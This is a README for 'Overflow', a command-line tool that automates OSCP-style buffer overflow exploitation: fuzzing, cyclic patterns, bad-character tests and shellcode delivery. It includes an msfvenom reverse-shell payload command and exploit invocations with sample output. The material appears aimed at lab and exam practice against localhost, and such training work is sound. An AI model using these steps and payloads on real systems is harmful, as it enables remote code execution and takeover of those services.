# Overflow
Overflow is a command-line tool you can use to exploit OSCP-style buffer
overflows.

## Table of Contents
 - [Installation](#installation)
   * [Pre-Built Binaries](#pre-built-binaries)
   * [Using Go Get](#using-go-get)
   * [Building from Source](#building-from-source)
 - [Usage](#usage)
   * [Fuzzing for Buffer Length](#fuzzing-for-buffer-length)
     + [Fuzz Usage](#fuzz-usage)
     + [Fuzz Example](#fuzz-example)
   * [Sending Cyclic Patterns](#sending-cyclic-patterns)
     + [Pattern Usage](#pattern-usage)
     + [Pattern Example](#pattern-example)
   * [Sending Bad Characters](#sending-bad-characters)
     + [Chars Usage](#chars-usage)
     + [Chars Example](#chars-example)
   * [Running Exploits](#running-exploits)
     + [Exploit Usage](#exploit-usage)
     + [Exploit Example](#exploit-example)

## Installation

### Pre-Built Binaries
I'll do this as soon as I make a release.

### Using Go Get
If you have a golang environment set up, you can use `go get` to fetch and
install the binary in your `$GOPATH/bin` directory.
```sh
$ go get github.com/sradley/overflow
```

### Building from Source
If you have a golang environment set up, you can build straight from source.

The following commands will install dependencies and compile a working binary. 
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go get && go build
```

You can also use `go install` to install the binary in your `$GOPATH/bin`
directory.
```sh
$ git clone https://github.com/sradley/overflow.git
$ cd overflow
$ go install
```

## Usage
The help text is pretty exhaustive, so it's a good place to start if you want
to get a feel for this tool.
```
$ overflow help
$ overflow (fuzz | pattern | chars | exploit) --help
```

The required flags for every subcommand are "host" and "port". You can also
specify any prefixes or suffixes to put before and after the payload, in the
case that a menu or something is presented to you when you open the socket.

### Fuzzing for Buffer Length
Possibly the most important step in buffer overflow exploitation is finding the
length of buffer you want to target. An easy way to do this is to send
increasingly large sequences of bytes to the buffer until it crashes.

The `fuzz` subcommand sends increasingly large sequences of bytes (the increase
is specifed by the "step" flag) until the service crashes. This tool also
outputs the possible size of the buffer, in case it wasn't easy enough already. 

#### Fuzz Usage
The required flags are "host", "port" and "step".
```
$ overflow fuzz (-H|--host HOST) (-P|--port PORT) (-S|--step STEP) [flags]
```

#### Fuzz Example
Here's a quick example using this subcommand to fuzz for the length of the
target buffer in 100-byte steps.
```
$ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
```
```
   ____                  __ _               
  / __ \                / _| |              
 | |  | |_   _____ _ __| |_| | _____      __
 | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
  
 Overflow v0.1
 by Stephen Radley (github.com/sradley)
─────────────────────────────────────────────────
 :: Mode        : fuzz 
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Step        : 100
─────────────────────────────────────────────────
 > Building payload.
 > Sending 100-byte payload.
 > Building payload.
 > Sending 200-byte payload.
 > Building payload.
 > Sending 300-byte payload.
 > Building payload.
 > Sending 400-byte payload.
 > Building payload.
 > Sending 500-byte payload.
 
 Success! Length of buffer is (400, 500].
```

### Sending Cyclic Patterns
Why would you want to do this? Well, sending a cyclic pattern of bytes to the
target service is a very easy way to figure out the offset of the EIP register.
Tools like `mona` can automatically determine the offset of particular
registers if buffer has been overflowed with a cyclic pattern of bytes.

The `pattern` subcommand streamlines the process of generating a cyclic pattern
of bytes and sending it to the target service. Turning what is normally an
annoying multi-step process into a single command.

#### Pattern Usage
The required flags are "host", "port" and "length".
```
$ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
```

#### Pattern Example
Here's a quick example using this subcommand to send a 60-byte cyclic pattern
to the target service.
```
$ overflow pattern -H 127.0.0.1 -P 4444 -l 65
```
```
   ____                  __ _               
  / __ \                / _| |              
 | |  | |_   _____ _ __| |_| | _____      __
 | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  

 Overflow v0.1
 by Stephen Radley (github.com/sradley)
─────────────────────────────────────────────────
 :: Mode        : pattern 
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Length      : 65
─────────────────────────────────────────────────
 > Building payload.
 > Sending 65-byte payload.
 
 Success! No errors found.
```

You can see the pattern sent in the `netcat` output below.
```
$ nc -lvp 4444
Connection from 127.0.0.1:48870
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
```

### Sending Bad Characters
An important part of buffer overflow exploitation is determining which
characters are "bad", or which characters are treated differently by the target
service.

The `chars` subcommand sends every character from 0x00 to 0xFF to the target
service. You can optionally exclude particular characters from the payload sent
to the target service.

#### Chars Usage
Required flags are "host", "port" and "offset".
```
$ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
```

#### Chars Example
Here's an example showing the use of this subcommand. Make sure you include the
offset to the EIP register.
```
$ overflow chars -H 127.0.0.1 -P 4444 -o 160
```
```
   ____                  __ _               
  / __ \                / _| |              
 | |  | |_   _____ _ __| |_| | _____      __
 | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  

 Overflow v0.1
 by Stephen Radley (github.com/sradley)
─────────────────────────────────────────────────
 :: Mode        : chars 
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
─────────────────────────────────────────────────
 > Building payload.
 > Sending 416-byte payload. 
 
 Success! No errors found.
```

You can also optionally specify characters to exclude from the payload, make
sure that you use the format in the example below.
```
$ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
```
```
   ____                  __ _               
  / __ \                / _| |              
 | |  | |_   _____ _ __| |_| | _____      __
 | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  

 Overflow v0.1
 by Stephen Radley (github.com/sradley)
─────────────────────────────────────────────────
 :: Mode        : chars 
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
 :: Exclude     : "\x00\x41\xAB\x01"
─────────────────────────────────────────────────
 2020/10/29 20:19:05 Starting overflow
─────────────────────────────────────────────────
 > Building payload.
 > Sending 412-byte payload. 
 
 Success! No errors found.
```

### Running Exploits
Once you've found the offset of the EIP register, and a valid jump address, you
can execute shellcode on the target service. The `exploit` subcommand provides
an easy way to do so.

#### Exploit Usage
Required parameters are "host", "port", "offset", "jump" and "shell". Where
shell is the path to your desired payload.
```
$ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
    (-j|--jump JUMP) (-S|--shell SHELL) [flags]
```

#### Exploit Example
Here's a brief example explaining how you can use the `exploit` subcommand to
execute a payload generated by `msfvenom`.

Generate a **raw** payload using `msfvenom`, call it whatever you want.
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
    EXITFUNC=thread -b "\x00" -f raw -o payload.shell
```

Then just use the tool as follows, ensuring you include the offset to the EIP
register and the jump address in the format used below.
```
$ overflow -H 127.0.0.1 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
```
```
   ____                  __ _               
  / __ \                / _| |              
 | |  | |_   _____ _ __| |_| | _____      __
 | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  

 Overflow v0.1
 by Stephen Radley (github.com/sradley)
─────────────────────────────────────────────────
 :: Mode        : exploit 
 :: Host        : 127.0.0.1
 :: Port        : 4444
 :: Offset      : 160
 :: Jump        : "0x5f4a358f"
 :: Shell       : path/to/payload.shell
─────────────────────────────────────────────────
 > Building payload.
 > Sending 531-byte payload. 
 
 Success! No errors found.
```

